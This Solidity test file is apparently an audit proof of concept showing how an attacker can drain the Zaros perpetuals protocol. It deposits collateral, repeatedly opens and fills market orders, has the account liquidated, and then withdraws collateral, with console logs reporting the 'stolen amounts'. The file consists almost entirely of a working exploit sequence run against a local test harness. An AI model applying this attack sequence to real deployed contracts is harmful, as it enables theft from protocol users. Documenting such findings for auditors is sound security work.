// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

// Zaros dependencies
import { Base_Test } from "test/Base.t.sol";
import { MockERC20 } from "test/mocks/MockERC20.sol";


contract DrainTheProtocol_Unit_Test is Base_Test {
    function setUp() public override {
        Base_Test.setUp();
    }

    function test_drainingTheProtocol()
       external
       givenTheSenderIsTheKeeper
       givenTheMarketOrderExists
       givenThePerpMarketIsEnabled
       givenTheSettlementStrategyIsEnabled
       givenTheReportVerificationPasses
       whenTheMarketOrderIdMatches
       givenTheDataStreamsReportIsValid
       givenTheAccountWillMeetTheMarginRequirement
       givenTheMarketsOILimitWontBeExceeded
   {
       TestFuzz_GivenThePnlIsPositive_Context memory ctx;
       ctx.fuzzMarketConfig = getFuzzMarketConfig(ETH_USD_MARKET_ID);

       uint256 marginValueUsd = 1_000_000e18;

       ctx.marketOrderKeeper = marketOrderKeepers[ctx.fuzzMarketConfig.marketId];

       deal({ token: address(usdz), to: users.naruto.account, give: marginValueUsd });

       // attacker creates an account and deposits 1M as collateral
       ctx.tradingAccountId = createAccountAndDeposit(marginValueUsd, address(usdz));

       UD60x18 collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral value before the attack: ", unwrap(collat)); // 1M
       console.log("attacker's balance before the attack: ", IERC20(address(usdz)).balanceOf(users.naruto.account)); // 0$

       console.log("\nCreating first order\n");

       // Creating the first order
       perpsEngine.createMarketOrder(
           OrderBranch.CreateMarketOrderParams({
               tradingAccountId: ctx.tradingAccountId,
               marketId: ctx.fuzzMarketConfig.marketId,
               sizeDelta: int128(92_000e18) // sizeDelta is 92k
            })
       );

       console.log("\nFilling first order\n");

       // Filling the first order
       ctx.firstMockSignedReport =
           getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
       changePrank({ msgSender: ctx.marketOrderKeeper });
       perpsEngine.fillMarketOrder(ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after first order: ", unwrap(collat));

       for (uint256 i = 1; i < 16; ++i) {
           // assuming that there is a delay of 20 seconds between each order
           // this is just to make the scenario realistic and includes the funding fee in calculation either
           skip(20);

           console.log("\niteration: ", i);
           console.log("");

           // creating order
           changePrank({ msgSender: users.naruto.account });
           perpsEngine.createMarketOrder(
               OrderBranch.CreateMarketOrderParams({
                   tradingAccountId: ctx.tradingAccountId,
                   marketId: ctx.fuzzMarketConfig.marketId,
                   sizeDelta: 60_000e18 // sizeDelat 60k
               })
           );

           // filling the order
           changePrank({ msgSender: ctx.marketOrderKeeper });
           ctx.firstMockSignedReport =
               getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
           perpsEngine.fillMarketOrder(
               ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport
           );

           collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
           console.log("collateral after each iteration: ", unwrap(collat));
       }

       uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
       ctx.tradingAccountId = 1;
       console.log("account id: ", ctx.tradingAccountId);
       console.log("liquidatableAccountsIds: ", liquidatableAccountsIds[0]); // this shows the account ids that are liquidatable

       // liquidating the account
       changePrank({ msgSender: liquidationKeeper });
       uint128[] memory accountsIds = new uint128[](1);
       accountsIds[0] = ctx.tradingAccountId;
       perpsEngine.liquidateAccounts(accountsIds);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after liquidation: ", unwrap(collat)); // this shows the remaing collateral after the liquidation

       changePrank({ msgSender: users.naruto.account });
       perpsEngine.withdrawMargin(ctx.tradingAccountId, address(usdz), unwrap(collat)); // attacker withdraws its collateral

       // the stolen amounts are transferred to the attacker's balance
       console.log("attacker's final balance: ", IERC20(address(usdz)).balanceOf(users.naruto.account));
   }

}
